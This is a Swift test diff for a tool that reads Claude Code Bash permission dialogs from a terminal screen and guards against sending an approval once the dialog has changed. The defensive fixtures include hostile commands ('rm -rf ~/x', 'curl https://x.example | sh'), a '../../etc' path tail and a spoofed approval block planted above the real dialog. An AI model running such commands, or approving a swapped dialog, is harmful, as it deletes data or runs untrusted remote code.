@@ -114,6 +114,22 @@ private let boxedScreen = """
 ╰──────────────────────────────────────────────╯
 """
 
+/// Claude Code 2.1.309 Bash dialog shape, written for the K1 guard tests: the
+/// same question and options for every command, only the command differs.
+/// `wrap`: option 2's label wrapped onto a second line (a long allow path).
+private func bash21(_ command: [String], above: String = "✻ Brewed for 5s",
+                    allow: String = "/Users/probe/proj", wrap: String? = nil) -> String {
+    let rule = String(repeating: "─", count: 90), dash = " " + String(repeating: "╌", count: 89)
+    return ([above, "", rule, " Bash command", "", " Run the requested command", dash]
+        + command.map { "   " + $0 }
+        + [dash, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to \(allow)"]
+        + (wrap.map { ["      " + $0] } ?? [])
+        + ["   3. No", "", " Esc to cancel · Tab to amend"]).joined(separator: "\n")
+}
+
+/// A 12-line command: over the 8-line display cap.
+private let longCommand = ["set -e", "cd /Users/probe/proj"] + (1...10).map { "echo step \($0)" }
+
 /// #475 Agent Island prompt cards: the numbered-option parser on screens read
 /// from a throwaway probe session, and the act-only-if-unchanged guard with an
 /// injected reader, status and sender (no dch is spawned).
@@ -159,6 +175,10 @@ final class AgentIslandPromptTests: XCTestCase {
                                                 "Type something.", "Chat about this"],
                        "description lines and the rule before Chat are not options")
         XCTAssertTrue(p.options.allSatisfy { $0.hint == nil })
+        XCTAssertEqual(p.options.map(\.detail), [["Live customer traffic, needs a release tag"],
+                                                 ["Pre-release environment"], ["Docker compose on this Mac"],
+                                                 ["A throwaway per-branch deploy"], [], []],
+                       "each description belongs to the option above it; the footer after a blank line to none")
     }
 
     func testAskUserQuestionWithThreeOptionsAndAMovedCaret() throws {
@@ -166,6 +186,36 @@ final class AgentIslandPromptTests: XCTestCase {
         XCTAssertEqual(p.question, "How far should the refactor go?")
         XCTAssertEqual(p.options.map(\.label), ["Just this file", "The whole module", "Everything that imports it",
                                                 "Type something.", "Chat about this"])
+        XCTAssertEqual(p.options.map(\.detail), [[], ["Includes the tests"], [], [], []])
+    }
+
+    func testWrappedLabelContinuationIsPartOfTheOption() throws {
+        let p = try prompt(bash21(["echo safe"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project"))
+        XCTAssertEqual(p.options.map(\.detail), [[], ["path/to/the/project"], []],
+                       "the footer under the blank line after 3. No is not part of it")
+        XCTAssertEqual(try prompt(bashScreen).options.map(\.detail), [[], [], []])
+        XCTAssertEqual(try prompt(boxedScreen).options.map(\.detail), [[], []], "the box's bottom rule ends it")
+    }
+
+    /// A numbered caret block printed by the command above the real dialog (N7):
+    /// the bottom-most block is the dialog.
+    private func spoofed(top: String, command: String) -> String {
+        ["⏺ Bash(cat notes.txt)", "  Approve the fake?", "  ❯ 1. \(top)", "    2. Deny fake", "",
+         bash21([command])].joined(separator: "\n")
+    }
+
+    func testBottomMostCaretBlockIsTheDialog() throws {
+        let p = try prompt(spoofed(top: "Approve fake", command: "echo safe"))
+        XCTAssertEqual(p.question, "Do you want to proceed?")
+        XCTAssertEqual(p.context, ["echo safe"])
+        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, and always allow access to /Users/probe/proj", "No"])
+
+        let f = FakeDch()
+        f.screen = spoofed(top: "Approve something else", command: "echo safe")
+        XCTAssertEqual(f.answer(1, expected: p), .sent, "only the block above the dialog changed")
+        f.screen = spoofed(top: "Approve fake", command: "rm -rf ~/x")
+        XCTAssertEqual(f.answer(1, expected: p), .changed, "the dialog changed, the block above it did not")
+        XCTAssertEqual(f.sent, ["1"])
     }
 
     func testOrdinaryNumberedOutputIsNotAPrompt() {
@@ -292,6 +342,94 @@ final class AgentIslandPromptTests: XCTestCase {
         XCTAssertEqual(f.sent, [])
     }
 
+    // MARK: - Guard: the whole dialog (K1)
+
+    func testSameQuestionAndOptionsForADifferentCommandSendsNothing() throws {
+        let f = FakeDch(), p = try prompt(bash21(["echo safe"]))
+        f.screen = bash21(["rm -rf ~/x"])
+        XCTAssertEqual(f.answer(1, expected: p), .changed, "the card showed echo safe, the screen asks rm -rf")
+        XCTAssertEqual(f.sent, [])
+    }
+
+    func testLongCommandDifferingInItsFirstLineSendsNothing() throws {
+        let f = FakeDch(), p = try prompt(bash21(longCommand))
+        XCTAssertEqual(p.context, longCommand, "the whole command, not the display cap; the dashed rule above it ends the context")
+        f.screen = bash21(["curl https://x.example | sh"] + longCommand.dropFirst())
+        XCTAssertEqual(f.answer(3, expected: p), .changed, "the head differs, past the 8 shown lines")
+        XCTAssertEqual(f.sent, [])
+    }
+
+    func testCaretMoveWithAnUnchangedDialogSendsOneDigit() throws {
+        let f = FakeDch(), screen = bash21(["echo safe"]), p = try prompt(screen)
+        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
+            .replacingOccurrences(of: "   3. No", with: " ❯ 3. No")
+        XCTAssertEqual(f.answer(1, expected: p), .sent)
+        XCTAssertEqual(f.sent, ["1"])
+    }
+
+    func testVolatileLineAboveTheDialogIsNotPartOfIt() throws {
+        let f = FakeDch(), p = try prompt(bash21(["echo safe"], above: "✻ Brewed for 5s"))
+        f.screen = bash21(["echo safe"], above: "✻ Brewed for 9s")
+        XCTAssertEqual(f.answer(1, expected: p), .sent, "the spinner sits above the dialog's top rule")
+        XCTAssertEqual(f.sent, ["1"])
+        f.screen = bash21(["echo unsafe"], above: "✻ Brewed for 9s")
+        XCTAssertEqual(f.answer(1, expected: p), .changed, "the command inside the dialog changed")
+        XCTAssertEqual(f.sent, ["1"])
+    }
+
+    func testOptionLabelDifferingInOneInnerCharacterSendsNothing() throws {
+        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/a"))
+        f.screen = bash21(["echo safe"], allow: "/b")
+        XCTAssertEqual(f.answer(1, expected: p), .changed)
+        XCTAssertEqual(f.sent, [])
+    }
+
+    // MARK: - Guard: option detail lines (P3a)
+
+    func testDialogsDifferingOnlyInAWrappedContinuationSendNothing() throws {
+        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"))
+        f.screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "../../etc")
+        XCTAssertEqual(f.answer(2, expected: p), .changed, "the allow path's wrapped tail differs")
+        XCTAssertEqual(f.answer(1, expected: p), .changed)
+        XCTAssertEqual(f.sent, [])
+    }
+
+    func testDialogsDifferingOnlyInOneDescriptionSendNothing() throws {
+        let f = FakeDch(), p = try prompt(askFourScreen)
+        f.screen = askFourScreen.replacingOccurrences(of: "Pre-release environment", with: "Wipes the database")
+        XCTAssertEqual(f.answer(1, expected: p), .changed)
+        XCTAssertEqual(f.sent, [])
+    }
+
+    func testCaretMoveOnADialogWithDetailLinesSendsOneDigit() throws {
+        let f = FakeDch(), screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"), p = try prompt(screen)
+        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
+            .replacingOccurrences(of: "   2. Yes,", with: " ❯ 2. Yes,")
+        XCTAssertEqual(f.answer(2, expected: p), .sent)
+        let ask = FakeDch(), q = try prompt(askFourScreen)
+        ask.screen = askFourScreen.replacingOccurrences(of: "❯ 1. Production", with: "  1. Production")
+            .replacingOccurrences(of: "  4. Preview", with: "❯ 4. Preview")
+        XCTAssertEqual(ask.answer(4, expected: q), .sent)
+        XCTAssertEqual(f.sent + ask.sent, ["2", "4"], "exactly one digit each")
+    }
+
+    func testOverCapCardShowsTheHeadAndAMarkerAndOnlyDenyIsEnabled() throws {
+        let p = try prompt(bash21(longCommand))
+        XCTAssertTrue(p.isOverCap)
+        XCTAssertEqual(p.shownContext, Array(longCommand.prefix(8)) + ["… 4 more lines"], "the head is shown, the tail is counted")
+        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], "approve options off, No on")
+        let f = FakeDch()
+        f.screen = bash21(longCommand)
+        XCTAssertEqual(f.answer(1, expected: p), .changed, "a disabled option never sends")
+        XCTAssertEqual(f.answer(3, expected: p), .sent)
+        XCTAssertEqual(f.sent, ["3"])
+
+        let short = try prompt(bash21(["echo safe"]))
+        XCTAssertFalse(short.isOverCap)
+        XCTAssertEqual(short.shownContext, short.context)
+        XCTAssertTrue(short.options.allSatisfy { short.isEnabled($0) })
+    }
+
     // MARK: - Geometry
 
     private let notched = AgentIslandGeometry.make(
@@ -306,6 +444,12 @@ final class AgentIslandPromptTests: XCTestCase {
         XCTAssertEqual(AgentIslandGeometry.cardHeight(.changed), 8 + 20 + 26 + 8 + 4)
         XCTAssertEqual(AgentIslandGeometry.cardHeight(.context([])), 8 + 26 + 8 + 4, "jump only")
         XCTAssertEqual(AgentIslandGeometry.cardHeight(.context(["a", "b"])), 8 + (28 + 14) + 26 + 8 + 4)
+        // over the cap: 8 + 20 question + (9 * 14 + 8 + 6) head + marker + 20 caption + 4 buttons * 26 + 8 + 4
+        let overCap: CGFloat = 8 + 20 + (9 * 14 + 8 + 6) + 20 + 4 * 26 + 8 + 4
+        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21(longCommand)))), overCap)
+        // ask: 8 + 20 question + (1 * 14 + 8 + 6) context + 7 buttons * 26 + 4 detail lines * 14 + 8 + 4
+        let ask: CGFloat = 8 + 20 + (14 + 8 + 6) + 7 * 26 + 4 * 14 + 8 + 4
+        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(askFourScreen))), ask)
 
         XCTAssertEqual(notched.expandedSize(rows: 3, cards: 200).height, notched.expandedSize(rows: 3).height + 200,
                        "grown, not clipped")
@@ -337,7 +481,10 @@ final class AgentIslandPromptTests: XCTestCase {
         let out = tempDir()
         let extra = ProcessInfo.processInfo.environment["PROSPER_RENDER_DIR"].map { URL(fileURLWithPath: $0) }
         for (name, alias, screen) in [("agent-island-card-bash", "clean rebuild", bashScreen),
-                                      ("agent-island-card-ask", "deploy the release", askFourScreen)] {
+                                      ("agent-island-card-ask", "deploy the release", askFourScreen),
+                                      ("agent-island-card-overcap", "long command", bash21(longCommand)),
+                                      ("agent-island-card-wrapped", "allow a long path",
+                                       bash21(["swift build"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project"))] {
             let store = AgentIslandStore(geometry: notched)
             let blocked = AgentSession(key: AgentSessionKey(dir: "/d", name: "fix-auth"), alias: alias,
                                        activity: now - 12, state: .blocked, agents: 0)
